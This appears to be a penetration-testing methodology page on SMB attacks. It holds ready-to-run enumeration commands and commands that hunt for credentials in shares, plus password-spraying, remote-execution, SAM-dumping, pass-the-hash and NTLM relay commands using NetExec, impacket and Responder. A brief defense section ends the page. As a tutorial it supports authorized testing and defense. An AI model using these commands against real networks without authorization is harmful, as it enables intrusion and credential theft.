---
layout: page
title: "SMB Attacks"
subtitle: "Enumerating Windows file shares and abusing SMB access, credentials and NTLM"
permalink: /methodology/services-attacks/smb-attacks/
---

Server Message Block (SMB) provides shared access to files and printers across a network and is common in Windows environments. SMB often exposes share names, users and policies to unauthenticated clients, and a valid credential can turn a share into a source of further credentials. Use this page to move from discovery to share content, then to credential-based and protocol-level attacks.

## Workflow

1. Fingerprint the service on TCP 139 and 445 and note the SMB signing status.
2. Test anonymous (null) access to list shares, users and domain information.
3. Map readable and writable shares and search their contents for credentials.
4. Use any recovered credentials to mount shares and repeat the search.
5. Test credential reuse across hosts with a single password (spraying).
6. If an account has administrative rights, extract hashes, run commands or pass hashes.
7. If hash cracking fails, consider relaying captured NTLM authentication.

## Enumeration

```bash
sudo nmap TARGET_IP -sV -sC -p139,445
smbclient -N -L //TARGET_IP
smbmap -H TARGET_IP
smbmap -H TARGET_IP -r SHARE_NAME
rpcclient -U'%' TARGET_IP
```

Inside `rpcclient`, `enumdomusers` lists domain users with their RIDs. Tools such as `enum4linux-ng`, `nmblookup`, `net` and `smbclient` also return workgroup, OS, group, share and password policy data.

## Searching shares

```bash
sudo mkdir /mnt/SHARE_NAME
sudo mount -t cifs -o username=USERNAME,password=PASSWORD,domain=. //TARGET_IP/SHARE_NAME /mnt/SHARE_NAME
find /mnt/SHARE_NAME/ -name "*cred*"
grep -rn /mnt/SHARE_NAME/ -ie cred
```

```cmd
net use N: \\TARGET_IP\SHARE_NAME /user:USERNAME PASSWORD
dir N:\ /a-d /s /b
dir N:\*cred* /s /b
findstr /s /i cred N:\*.*
```

```powershell
New-PSDrive -Name "N" -Root "\\TARGET_IP\SHARE_NAME" -PSProvider "FileSystem"
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

> Prioritise shares that look like IT, finance or backup data. A single share with thousands of files can take far longer than the value it returns.
{: .tip }

## Spraying and command execution

```bash
nxc smb TARGET_IP -u USERLIST -p 'PASSWORD' --local-auth
nxc smb TARGET_IP -u USERLIST -p 'PASSWORD' --local-auth --continue-on-success
impacket-psexec USERNAME:'PASSWORD'@TARGET_IP
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' -x 'whoami' --exec-method smbexec
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' --sam
nxc smb SUBNET -u USERNAME -p 'PASSWORD' --loggedon-users
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH
```

`impacket-psexec`, `impacket-smbexec` and `impacket-atexec` share the same options. PsExec requires a writable `ADMIN$` share; SMBExec can work without one because it runs a local SMB server to receive output.

## Forced authentication

```bash
sudo responder -I INTERFACE
impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP
```

Responder answers LLMNR and NBT-NS queries and captures NetNTLM challenge-response material. NTLMv2 captures are cracked with Hashcat mode 5600. If cracking fails, `ntlmrelayx` can relay the authentication to another host, for example to dump the SAM database or to start a reverse shell.

## What to look for

- Anonymous listing of shares, users or policies.
- Write access on a share, which allows upload and possibly script execution.
- Local administrator reuse across a subnet, shown by `Pwn3d!` markers.
- SMB signing set to "enabled but not required".
- Captured NetNTLMv2 hashes in the Responder logs directory.

## Pitfalls

- NetExec stops after the first valid login unless `--continue-on-success` is used.
- `--local-auth` is required against hosts that are not domain joined.
- Failed attempts count toward lockout. Check the policy before spraying.
- Relayed sessions only work when signing is not enforced on the target.

> Anonymous SMB access and reused local administrator passwords are the two findings that most often lead to domain compromise from this service.
{: .warning }

## Defense and prevention

Disable anonymous and null-session access, enforce SMB signing, grant share permissions on least privilege, use unique local administrator passwords per host, and block NTLM where feasible. See the [services prevention](/methodology/services-attacks/prevention/) page for the complete list.
